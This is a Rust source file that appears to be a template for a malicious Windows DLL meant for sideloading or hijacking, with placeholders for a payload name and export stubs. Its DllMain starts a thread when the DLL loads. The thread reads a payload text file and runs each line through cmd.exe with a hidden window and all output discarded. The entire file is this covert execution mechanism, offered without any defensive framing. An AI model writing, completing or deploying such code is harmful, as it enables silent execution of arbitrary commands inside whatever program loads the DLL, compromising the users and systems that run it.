#![allow(non_snake_case, dead_code, unused_imports)]
use std::ffi::c_void;
use std::fs;
use std::os::windows::process::CommandExt;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::sync::OnceLock;

type BOOL = i32;
type DWORD = u32;
type HINSTANCE = *mut c_void;
type LPVOID = *mut c_void;
type LPCWSTR = *const u16;
type LPTHREAD_START_ROUTINE = unsafe extern "system" fn(LPVOID) -> DWORD;

const DLL_PROCESS_ATTACH: DWORD = 1;
const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const PAYLOAD_NAME: &str = "__PAYLOAD_NAME__";
const PAYLOAD_FALLBACK: &str = "__PAYLOAD_FALLBACK__";

#[link(name = "kernel32")]
extern "system" {
    fn GetModuleFileNameW(h: HINSTANCE, buf: *mut u16, size: DWORD) -> DWORD;
    fn CreateThread(
        attr: LPVOID,
        stack: usize,
        start: LPTHREAD_START_ROUTINE,
        param: LPVOID,
        flags: DWORD,
        id: *mut DWORD,
    ) -> *mut c_void;
    fn CloseHandle(h: *mut c_void) -> i32;
}

static DLL_DIR: OnceLock<PathBuf> = OnceLock::new();

fn run_payload(dir: &PathBuf) {
    let local = dir.join(PAYLOAD_NAME);
    let path = if local.is_file() {
        local
    } else {
        PathBuf::from(PAYLOAD_FALLBACK)
    };
    let Ok(text) = fs::read_to_string(path) else { return; };
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() { continue; }
        let _ = Command::new("cmd.exe")
            .arg("/c")
            .raw_arg(line)
            .creation_flags(CREATE_NO_WINDOW)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    }
}

unsafe extern "system" fn payload_thread(_: LPVOID) -> DWORD {
    if let Some(dir) = DLL_DIR.get() {
        run_payload(dir);
    }
    0
}

#[no_mangle]
pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _r: LPVOID) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        unsafe {
            let mut buf = [0u16; 512];
            let n = GetModuleFileNameW(hinst, buf.as_mut_ptr(), 512);
            if n > 0 {
                let path = String::from_utf16_lossy(&buf[..n as usize]);
                if let Some(parent) = PathBuf::from(&path).parent() {
                    let _ = DLL_DIR.set(parent.to_path_buf());
                }
            }
        }
        let t = unsafe { CreateThread(std::ptr::null_mut(), 0, payload_thread, std::ptr::null_mut(), 0, std::ptr::null_mut()) };
        if !t.is_null() {
            unsafe { CloseHandle(t); }
        }
    }
    1
}

__STUBS__
